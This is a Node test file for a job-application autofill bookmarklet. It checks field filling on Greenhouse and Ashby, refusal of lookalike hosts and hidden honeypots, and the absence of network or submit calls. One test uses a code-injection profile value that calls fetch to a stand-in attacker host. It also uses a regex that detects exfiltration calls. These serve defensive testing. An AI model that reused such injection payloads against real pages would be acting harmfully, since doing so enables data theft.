/**
 * CHANGE LOG
 * -----------------------------------------------------------------------------
 * SEQ                 | AUTHOR                                      | DESCRIPTION
 * -----------------------------------------------------------------------------
 * 1 | maintainer@emeraldcoastsystemsgroup.com | Prove offline Greenhouse and Ashby autofill, profile normalization, non-overwrite behavior, and the absence of network, upload, or submit actions.
 * 2 | maintainer@emeraldcoastsystemsgroup.com | Reject hidden honeypots and lookalike hosts before profile decoding, while documenting that normal field events can activate host-page handlers.
 */
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import test from 'node:test';
import vm from 'node:vm';

const require = createRequire(import.meta.url);
const { createAutofillBookmarklet, normalizeAutofillProfile } = require('../lib/autofill-bookmarklet');

class FakeElement {
  constructor(attributes = {}, label = '') {
    this.attributes = { ...attributes };
    this.tagName = (attributes.tagName || 'input').toUpperCase();
    this.type = attributes.type || 'text';
    this.value = attributes.value || '';
    this.disabled = false;
    this.readOnly = false;
    this.hidden = false;
    this.style = {};
    this.computedStyle = attributes.computedStyle || {};
    this.rect = attributes.rect || { left: 10, top: 10, right: 210, bottom: 40, width: 200, height: 30 };
    this.parentElement = attributes.parentElement || null;
    this.labels = label ? [{ textContent: label }] : [];
    this.events = [];
    this.clicks = 0;
  }

  getAttribute(name) { return this.attributes[name] || ''; }

  hasAttribute(name) { return Object.prototype.hasOwnProperty.call(this.attributes, name); }

  getClientRects() { return [{}]; }

  getBoundingClientRect() { return this.rect; }

  closest() { return null; }

  dispatchEvent(event) { this.events.push(event.type); return true; }

  click() { this.clicks += 1; }
}

class FakeDocument {
  constructor(elements) { this.elements = elements; this.documentElement = { clientWidth: 1280, clientHeight: 800 }; }

  querySelectorAll(selector) {
    if (selector === 'input,textarea,select') return this.elements;
    if (selector.startsWith('#')) {
      return this.elements.filter((element) => element.getAttribute('id') === selector.slice(1));
    }
    const match = selector.match(/^\[([^=]+)="([\s\S]*)"\]$/);
    return match ? this.elements.filter((element) => element.getAttribute(match[1]) === match[2]) : [];
  }
}

class FakeEvent {
  constructor(type) { this.type = type; }
}

function executeBookmarklet(profile, hostname, elements) {
  const alerts = [];
  let decodes = 0;
  class CountingDecoder extends TextDecoder {
    decode(...args) { decodes += 1; return super.decode(...args); }
  }
  const source = createAutofillBookmarklet(profile).slice('javascript:'.length);
  const context = {
    alert: (message) => alerts.push(message), atob: (value) => Buffer.from(value, 'base64').toString('binary'),
    document: new FakeDocument(elements), Event: FakeEvent,
    getComputedStyle: (element) => ({ display: 'block', visibility: 'visible', opacity: '1', ...element.computedStyle }),
    innerWidth: 1280, innerHeight: 800, location: { hostname }, TextDecoder: CountingDecoder, Uint8Array,
    fetch: () => { throw new Error('bookmarklet attempted a network call'); },
  };
  vm.runInNewContext(source, context, { timeout: 1_000 });
  alerts.decodes = decodes;
  return alerts;
}

test('normalizes overlay-first allowlisted fields without embedding the full career record', () => {
  const result = normalizeAutofillProfile({
    profile: { name: 'Career Name', email: 'old@example.test', location: 'Austin, TX' },
    roles: [{ title: 'Engineer', org: 'Example Systems', confidential: 'never copy me' }],
    metrics_bank: ['private achievement'],
  }, {
    contact: { name: 'Doe, Jamie Q', email: 'jamie@example.test', phone: '+15551234567' },
    address: { postal_code: '78701' },
    eligibility: { authorized_to_work: true, requires_sponsorship: false },
  });
  assert.deepEqual(result, {
    fullName: 'Doe, Jamie Q', firstName: 'Jamie', middleName: 'Q', lastName: 'Doe',
    city: 'Austin', state: 'TX', email: 'jamie@example.test', phone: '+15551234567',
    postalCode: '78701', currentCompany: 'Example Systems', currentTitle: 'Engineer',
    workAuthorization: 'Yes', sponsorship: 'No',
  });
  assert.ok(!JSON.stringify(result).includes('private achievement'));
  assert.ok(!JSON.stringify(result).includes('never copy me'));
});

test('fills empty Greenhouse fields, preserves existing answers, and never touches submit or files', () => {
  const first = new FakeElement({ id: 'first_name', name: 'job_application[first_name]' }, 'First name');
  const last = new FakeElement({ id: 'last_name', name: 'job_application[last_name]', value: 'Already Here' }, 'Last name');
  const email = new FakeElement({ id: 'email', name: 'job_application[email]' }, 'Email');
  const resume = new FakeElement({ type: 'file', name: 'resume' }, 'Resume');
  const submit = new FakeElement({ type: 'submit', name: 'submit' }, 'Submit application');
  const alerts = executeBookmarklet({
    fullName: 'Jamie Doe', email: 'jamie@example.test', phone: '+15551234567',
  }, 'boards.greenhouse.io', [first, last, email, resume, submit]);
  assert.equal(first.value, 'Jamie');
  assert.equal(last.value, 'Already Here');
  assert.equal(email.value, 'jamie@example.test');
  assert.equal(resume.value, '');
  assert.equal(submit.clicks, 0);
  assert.deepEqual(first.events, ['input', 'change', 'blur']);
  assert.match(alerts[0], /Greenhouse/);
  assert.match(alerts[0], /did not directly .*submit/i);
  assert.match(alerts[0], /page can react to field-change events/i);
});

test('fills Ashby system fields after the stack is unavailable and skips demographic fields', () => {
  const name = new FakeElement({ name: '_systemfield_name' }, 'Name');
  const email = new FakeElement({ name: '_systemfield_email' }, 'Email');
  const phone = new FakeElement({ name: '_systemfield_phone' }, 'Phone');
  const gender = new FakeElement({ name: 'gender' }, 'Gender identity');
  const alerts = executeBookmarklet({
    fullName: 'Jamie Doe', email: 'jamie@example.test', phone: '+15551234567', gender: 'Anything',
  }, 'jobs.ashbyhq.com', [name, email, phone, gender]);
  assert.equal(name.value, 'Jamie Doe');
  assert.equal(email.value, 'jamie@example.test');
  assert.equal(phone.value, '+15551234567');
  assert.equal(gender.value, '');
  assert.match(alerts[0], /Ashby/);
});

test('profile text stays inert and the generated runtime contains no network or submit operation', () => {
  const bookmarklet = createAutofillBookmarklet({
    fullName: "Robert');fetch('https://attacker.invalid')//", email: 'safe@example.test',
  });
  assert.ok(bookmarklet.startsWith('javascript:'));
  assert.doesNotMatch(bookmarklet, /attacker\.invalid|safe@example\.test/);
  assert.doesNotMatch(bookmarklet, /\bfetch\s*\(|XMLHttpRequest|sendBeacon|WebSocket|\.submit\s*\(|\.click\s*\(/);
  assert.match(bookmarklet, /void runtimeAutofill/);
});

test('refuses phishing lookalikes before decoding the embedded profile', () => {
  const email = new FakeElement({ id: 'email', name: 'job_application[email]' }, 'Email');
  const alerts = executeBookmarklet({ email: 'private@example.test' },
    'greenhouse.io.attacker.invalid', [email]);
  assert.equal(email.value, '');
  assert.equal(alerts.decodes, 0);
  assert.match(alerts[0], /refused this unrecognized site/i);
});

test('rejects opacity, off-screen, zero-size, aria-hidden, and inert honeypots', () => {
  const hiddenParent = new FakeElement({ 'aria-hidden': 'true' });
  const opacity = new FakeElement({ name: 'urls[Portfolio]', computedStyle: { opacity: '0' } }, 'Portfolio');
  const offscreen = new FakeElement({ name: '_systemfield_email', rect: {
    left: -9999, right: -9799, top: 10, bottom: 40, width: 200, height: 30,
  } }, 'Email');
  const zeroSize = new FakeElement({ name: '_systemfield_phone', rect: {
    left: 10, right: 10, top: 10, bottom: 10, width: 0, height: 0,
  } }, 'Phone');
  const ariaHidden = new FakeElement({ name: '_systemfield_linkedin', parentElement: hiddenParent }, 'LinkedIn');
  const inert = new FakeElement({ name: '_systemfield_name', inert: '' }, 'Name');
  executeBookmarklet({
    fullName: 'Jamie Doe', email: 'private@example.test', phone: '+15551234567',
    website: 'https://portfolio.example', linkedin: 'https://linkedin.example/jamie',
  }, 'jobs.ashbyhq.com', [opacity, offscreen, zeroSize, ariaHidden, inert]);
  for (const element of [opacity, offscreen, zeroSize, ariaHidden, inert]) assert.equal(element.value, '');
});
